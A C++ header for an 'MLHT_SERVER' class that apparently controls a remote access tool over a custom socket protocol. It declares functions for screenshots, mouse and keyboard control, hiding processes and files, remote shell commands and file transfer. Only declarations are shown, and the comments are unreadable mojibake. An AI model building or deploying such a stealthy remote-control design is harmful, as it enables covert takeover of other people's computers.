#include "MLHT.h"
#include <stdio.h>

#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH+1)


//���Ľ��շ���ֵ
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1

#define FILE_OPEN_FAIL			2
#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4

#define OP_SUCCESS				5
#define OP_FAIL					6

#define NOT_GET_ACK				7
#define GET_ACK					8

#define FILE_TOO_LARGE			9

#define SOMETHINGWRONG			-2


class MLHT_SERVER
{
public:
	//����socket
	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	int server_port;//�����������˿�

	//�ͻ���socket
	SOCKADDR clientAddr;
	SOCKET clientsocket;

	char buffer[MLHT_MAX_LENGTH];
	
	WORD IDtt;	 //��¼��������
	
	MLHT *p_send;//��һ�������ı���
	MLHT *p_get; //��һ���յ��ı���

public:
	MLHT_SERVER(int port);			//��ʼ�������
	
	void WaitForClient();			//�ȴ��ͻ�������
	
	int WaitReturnPacket();			//�ȴ����ر��ģ���ⷵ�ر����Ƿ�Ϸ�
	int WaitForAckPacket();			//�ȴ�ACK���ر���

	void SendPacket(WORD mtu_type);	//���޲�������
	void SendACKPacket();			//��ACK���ر���
	void SendFINPacket();			//��FIN���ر���
	void SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength);//������������

	bool IsAckPacket();
	bool IsFinPacket();
	bool IsReturnPacket();

	//�����ļ���
	int SendFilePacket(
		WORD mtu_type,				//�ļ�����Э������
		FILE *fp,					//�ļ�ָ��
		int contentlen				//�ļ�����
		);

	//�����ļ���
	int GetFilePacket(
		FILE *fp				//����Ŀ���ļ���ָ��
		);
	
	///Զ���������
	int GetScreenshoot();
	void GetMouseOperate();
	void GetKeybroadOperate();
	
	//���̲���
	void GetProcessHide();
	void GetProcessShow();

	//�ļ�����
	void GetFileHide();
	void GetFileShow();

	//Shell����
	bool GetShellLs();
	bool GetShellMkdir();
	bool GetShellRmdir();
	bool GetShellRm();
			
	int GetUploadFile();			//�����ϴ��ļ�
	int SendDownloadFile();			//���������ļ�


 };